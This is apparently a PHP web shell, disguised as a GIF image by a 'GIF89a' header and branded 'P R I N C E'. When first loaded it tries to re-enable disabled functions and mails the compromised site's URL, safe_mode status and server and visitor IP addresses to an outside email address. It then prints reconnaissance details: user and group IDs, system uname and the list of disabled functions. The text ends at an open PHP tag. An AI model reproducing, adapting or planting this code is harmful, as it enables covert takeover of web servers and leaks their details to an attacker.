GIF89a
<div id="Layer1"><br><br><table width="100%" border="0">
<td><div align="leftp" class="style1"><blink>P R I N C E </blink ></td >
</table > 
<? @ini_restore("disable_functions");
if (!isset($_SESSION['bajak'])) {
	$visitcount = 0;
	$web = $_SERVER["HTTP_HOST"];
	$inj = $_SERVER["REQUEST_URI"];
	$body = "Shell Injector \n$web$inj";
	$safem0de = @ini_get('safe_mode');
	if (!$safem0de) {
		$security = "SAFE_MODE = OFF";
	} else {
		$security = "SAFE_MODE = ON";
	};
	$df = 'ini_get  disable!';
	$serper = gethostbyname($_SERVER['SERVER_ADDR']);
	$injektor = gethostbyname($_SERVER['REMOTE_ADDR']);
	mail("b0rsec@fastwebmail.it", "$body", "Shell Result http://$web$inj\n$security\nIP Server = $serper\n IP Injector= $injektor");
	$_SESSION['bajak'] = 0;
}
$safem0de = @ini_get('safe_mode');
if (!$safem0de) {
	$security = "SAFE_MODE : OFF";
} else {
	$security = "SAFE_MODE : ON";
}
echo "<title>P R I N C E</title><br><br>";
echo "<font size=2 color=#888888><b>".$security."</b><br>";
$cur_user = "(".get_current_user().")";
echo "<font size=2 color=#888888><b>User : uid=".getmyuid().$cur_user." gid=".getmygid().$cur_user."</b><br>";
echo "<font size=2 color=#888888><b>Uname : ".php_uname()."</b><br>";
echo "<font size=2 color=#888888><b>Disable Functions : ";
$df = 'ini_get  disable!';
if ((@function_exists('ini_get')) && ('' == ($df = @ini_get('disable_functions')))) {
	echo "NONE";
} else {
	echo "$df";
}

function pwd() {
	$cwd = getcwd();
	if ($u = strrpos($cwd, '/')) {
		if ($u != strlen($cwd) - 1) {
			return $cwd.'/';
		} else {
			return $cwd;
		};
	}
	elseif($u = strrpos($cwd, '\\')) {
		if ($u != strlen($cwd) - 1) {
			return $cwd.'\\';
		} else {
			return $cwd;
		};
	};
} ?> <?